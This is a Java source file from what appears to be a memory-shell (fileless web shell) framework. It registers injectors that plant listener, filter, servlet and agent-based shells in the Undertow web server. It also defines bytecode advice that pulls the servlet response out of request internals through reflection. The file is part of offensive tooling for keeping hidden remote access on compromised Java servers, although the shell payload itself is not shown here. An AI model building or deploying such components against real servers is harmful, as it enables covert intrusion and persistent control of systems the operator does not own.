package com.reajason.javaweb.memshell.server;

import com.reajason.javaweb.memshell.injector.undertow.UndertowFilterInjector;
import com.reajason.javaweb.memshell.injector.undertow.UndertowListenerInjector;
import com.reajason.javaweb.memshell.injector.undertow.UndertowServletHandlerAgentInjector;
import com.reajason.javaweb.memshell.injector.undertow.UndertowServletInjector;
import com.reajason.javaweb.memshell.utils.ShellCommonUtil;
import net.bytebuddy.asm.Advice;
import net.bytebuddy.implementation.bytecode.assign.Assigner;

import java.util.Map;

import static com.reajason.javaweb.memshell.ShellType.*;

/**
 * @author ReaJason
 * @since 2024/12/10
 */
public class UndertowShell extends AbstractShell {

    public static class ListenerInterceptor {

        @Advice.OnMethodExit
        public static void enter(@Advice.Argument(0) Object request, @Advice.Return(readOnly = false) Object response) throws Exception {
            Map<?, ?> map = (Map<?, ?>) ShellCommonUtil.getFieldValue(ShellCommonUtil.getFieldValue(request, "exchange"), "attachments");
            Object[] keys = map.keySet().toArray();
            for (Object key : keys) {
                if (map.get(key).toString().contains("ServletRequestContext")) {
                    response = ShellCommonUtil.getFieldValue(map.get(key), "servletResponse");
                    break;
                }
            }
        }
    }

    @Override
    public Class<?> getListenerInterceptor() {
        return ListenerInterceptor.class;
    }

    @Override
    public InjectorMapping getShellInjectorMapping() {
        return InjectorMapping.builder()
                .addInjector(LISTENER, UndertowListenerInjector.class)
                .addInjector(JAKARTA_LISTENER, UndertowListenerInjector.class)
                .addInjector(FILTER, UndertowFilterInjector.class)
                .addInjector(JAKARTA_FILTER, UndertowFilterInjector.class)
                .addInjector(SERVLET, UndertowServletInjector.class)
                .addInjector(JAKARTA_SERVLET, UndertowServletInjector.class)
                .addInjector(UNDERTOW_AGENT_SERVLET_HANDLER, UndertowServletHandlerAgentInjector.class)
                .build();
    }
}
